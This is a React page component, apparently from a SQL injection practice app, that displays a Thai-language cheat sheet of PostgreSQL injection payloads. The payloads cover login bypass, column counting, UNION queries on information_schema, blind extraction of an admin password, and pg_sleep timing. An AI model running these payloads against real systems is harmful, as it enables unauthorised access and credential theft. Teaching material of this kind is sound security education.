import React from 'react';
import { useNavigate } from 'react-router-dom';
import '../css/Handbook.css';
import { API } from "../config";

const Handbook = () => {
    const navigate = useNavigate();

    const sections = [
        {
            id: '0x01',
            title: 'ENTRY_POINTS',
            items: [
                {
                    name: 'Auth Bypass (String)',
                    desc: 'ใช้สำหรับข้ามการล็อกอินเมื่อระบบรับ Username เป็น String',
                    code: "' OR '1'='1' --"
                },
                {
                    name: 'Auth Bypass (Numeric)',
                    desc: 'ใช้เมื่อ ID หรือตัวเลขถูกส่งไปยัง Query โดยตรง',
                    code: "1 OR 1=1"
                }
            ]
        },
        {
            id: '0x02',
            title: 'DATABASE_ENUMERATION',
            items: [
                {
                    name: 'Find Column Count (ORDER BY)',
                    desc: 'ใช้หาจำนวน Column ดั้งเดิมเพื่อให้ทำ UNION ได้ถูกต้อง',
                    code: "' ORDER BY 1 --"
                }
            ]
        },
        {
            id: '0x03',
            title: 'INFORMATION_SCHEMA (PostgreSQL)',
            items: [
                {
                    name: 'Find Table Names',
                    desc: "ใน PostgreSQL (Supabase) จะใช้ information_schema.tables แทน sqlite_master",
                    code: "' UNION SELECT NULL, table_name, NULL FROM information_schema.tables WHERE table_schema='public' --"
                },
                {
                    name: 'Find Column Names',
                    desc: "ดึงรายชื่อ Column จากตารางที่ต้องการ (เช่น ตาราง users)",
                    code: "' UNION SELECT NULL, column_name, NULL FROM information_schema.columns WHERE table_name='users' --"
                }
            ]
        },
        {
            id: '0x04',
            title: 'BLIND_INJECTION',
            items: [
                {
                    name: 'Boolean Based',
                    desc: 'หน้าเว็บแสดงผลต่างกันระหว่าง True/False',
                    code: "' AND (SELECT SUBSTR(password,1,1) FROM users WHERE username='admin') = 'a' --"
                },
                {
                    name: 'Time Based (PostgreSQL)',
                    desc: 'ใน PostgreSQL เราสามารถใช้ฟังก์ชัน pg_sleep เพื่อหน่วงเวลาได้โดยตรง',
                    code: "' AND (SELECT 1 FROM pg_sleep(5)) --",
                    note: 'ระบบจะค้างไป 5 วินาทีหากเงื่อนไขเป็นจริง'
                }
            ]
        }
    ];

    return (
        <div className="handbook-body">
            <div className="container">
                <button onClick={() => navigate('/dashboard')} className="btn-back">
                    &lt; BACK_TO_DASHBOARD
                </button>

                <h1>HACKER'S_HANDBOOK.PDF (Supabase Edition)</h1>
                <p className="main-desc">ไฟล์ฐานข้อมูลความรู้สำหรับการโจมตีระบบ PostgreSQL (Cheat Sheet v2.0)</p>

                {sections.map((section) => (
                    <div key={section.id}>
                        <h2 className="category-title">{section.id}: {section.title}</h2>
                        {section.items.map((item, index) => (
                            <div className="cheat-card" key={index}>
                                <h3># {item.name}</h3>
                                <p className="desc">{item.desc}</p>
                                <code>{item.code}</code>
                                {item.note && <p className="desc" style={{marginTop: '10px'}}><strong>คำอธิบาย:</strong> {item.note}</p>}
                            </div>
                        ))}
                    </div>
                ))}

                <div className="footer-tag">
                    END_OF_DOCUMENT // TARGET_OS: LINUX_POSTGRES_SUPABASE
                </div>
            </div>
        </div>
    );
};

export default Handbook;